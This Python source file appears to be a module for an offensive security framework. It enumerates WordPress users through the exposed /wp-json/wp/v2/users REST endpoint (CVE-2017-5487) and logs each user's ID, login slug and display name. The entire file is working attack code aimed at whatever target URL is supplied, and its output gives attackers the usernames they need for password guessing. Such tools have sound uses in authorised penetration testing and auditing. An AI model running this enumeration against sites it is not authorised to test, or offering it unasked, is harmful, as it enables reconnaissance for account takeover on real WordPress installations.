import logging
from hmc.modules import Module, Argument
from urllib.parse import urljoin

log = logging.getLogger("hmc")

class WPUserEnumREST(Module):
    module_name = "wp_user_enum_rest"
    module_desc = "Enumerate WordPress users via REST API (CVE-2017-5487 behavior)"
    module_auth = "sk1ll3ss"

    module_args = [
        Argument("url", desc="Target URL (e.g., http://example.com)")
    ]

    async def execute(self, url):

        if not url.startswith(("http://", "https://")):
            url = "http://" + url

        users_url = urljoin(url, "/wp-json/wp/v2/users")

        try:
            response = await self.env.get(users_url)

            if response.status == 200 and "id" in response.body:
                import json
                try:
                    users_data = json.loads(response.body)
                    users = []
                    for user in users_data:
                        uid = user.get("id")
                        name = user.get("name")
                        slug = user.get("slug")
                        self.log_success(f"[+] User ID: {uid}, Username: {slug}, Display Name: {name}")
                        users.append({"id": uid, "username": slug, "display_name": name})
                    self.log_success(f"[+] Enumerated {len(users)} users via REST API.")
                    return {"users": users}
                except Exception:
                    self.log_failure("[-] Failed to parse REST API JSON response.")
                    return {"users": None}
            else:
                self.log_failure("[-] REST API not exposed or user listing disabled.")
                return {"users": None}

        except Exception as e:
            self.log_failure(f"[-] Error: {e}")
            return {"users": None}
